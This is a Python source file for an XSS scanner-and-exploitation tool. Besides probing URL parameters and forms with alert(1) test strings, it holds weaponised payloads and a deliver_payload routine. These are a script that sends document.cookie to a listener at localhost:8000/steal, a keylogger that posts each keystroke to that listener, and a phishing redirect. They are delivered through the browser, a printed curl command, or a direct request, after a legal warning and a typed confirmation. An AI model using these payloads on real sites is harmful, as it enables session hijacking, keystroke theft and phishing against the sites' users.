import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style
import webbrowser
import random

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Zeroscope/2.0'}
        self.payloads = {
            'detection': [
                '<script>alert(1)</script>',
                '" onmouseover=alert(1)',
                '<img src=x onerror=alert(1)>'
            ],
            'cookie': '<script>fetch("http://localhost:8000/steal?c="+document.cookie)</script>',
            'keylogger': '''<script>document.onkeypress=function(e){fetch("http://localhost:8000/log?k="+e.key)}</script>''',
            'redirect': '<script>window.location="http://localhost:8000/phish"</script>'
        }

    def scan(self, url, verbose=False, output_file=None):
        """Passive vulnerability scanning"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in self.payloads['detection']:
                    test_url = self._build_test_url(parsed, param, payload)
                    try:
                        res = self.session.get(test_url)
                        if payload in res.text:
                            self._log_vulnerability(
                                f"XSS in {param}",
                                test_url,
                                payload,
                                output_file
                            )
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Test failed: {e}{Style.RESET_ALL}")
            
            self._test_forms(url, verbose, output_file)
            
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] Scan error: {e}{Style.RESET_ALL}")

    def deliver_payload(self, url, param, payload_type):
        """Active payload delivery"""
        if payload_type not in self.payloads:
            print(f"{Fore.RED}[!] Invalid payload type{Style.RESET_ALL}")
            return False

        payload = self.payloads[payload_type]
        parsed = urlparse(url)
        
        print(f"\n{Fore.RED}[!] PREPARING TO DELIVER PAYLOAD{Style.RESET_ALL}")
        print(f"Target: {url}")
        print(f"Parameter: {param}")
        print(f"Payload Type: {payload_type}")
        print(f"\n{Fore.RED}[!] LEGAL WARNING: Only proceed with EXPLICIT permission{Style.RESET_ALL}")
        
        confirm = input(f"{Fore.YELLOW}[?] CONFIRM PAYLOAD DELIVERY (type 'YES'): {Style.RESET_ALL}")
        if confirm != 'YES':
            return False

        exploit_url = self._build_test_url(parsed, param, payload)
        
        print("\nDelivery Methods:")
        print("1. Browser (auto-open)")
        print("2. cURL command")
        print("3. Python requests")
        choice = input("Select (1-3): ")

        try:
            if choice == '1':
                webbrowser.open(exploit_url)
                print(f"{Fore.GREEN}[+] Payload opened in browser{Style.RESET_ALL}")
            elif choice == '2':
                print(f"\n{Fore.CYAN}curl -k '{exploit_url}'{Style.RESET_ALL}")
            elif choice == '3':
                res = self.session.get(exploit_url)
                print(f"{Fore.GREEN}[+] Delivered. Status: {res.status_code}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid choice{Style.RESET_ALL}")
                return False
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Delivery failed: {e}{Style.RESET_ALL}")
            return False

    def _build_test_url(self, parsed, param, payload):
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return parsed._replace(query="&".join(f"{k}={v[0]}" for k,v in params.items())).geturl()

    def _test_forms(self, url, verbose, output_file):
        try:
            res = self.session.get(url)
            soup = BeautifulSoup(res.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                
                for payload in self.payloads['detection']:
                    data = {}
                    for tag in inputs:
                        name = tag.get('name')
                        if name:
                            data[name] = payload if tag.get('type') in ('text', 'search') else tag.get('value', '')
                    
                    try:
                        if method == 'post':
                            res = self.session.post(urljoin(url, action), data=data)
                        else:
                            res = self.session.get(urljoin(url, action), params=data)
                            
                        if payload in res.text:
                            self._log_vulnerability(
                                f"Form XSS at {action}",
                                url,
                                payload,
                                output_file
                            )
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Form test failed: {e}{Style.RESET_ALL}")
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] Form scan error: {e}{Style.RESET_ALL}")

    def _log_vulnerability(self, title, url, payload, output_file):
        msg = f"{Fore.GREEN}[+] {title}{Style.RESET_ALL}\nURL: {url}\nPayload: {payload}\n"
        print(msg)
        if output_file:
            with open(output_file, 'a') as f:
                f.write(msg + "\n")
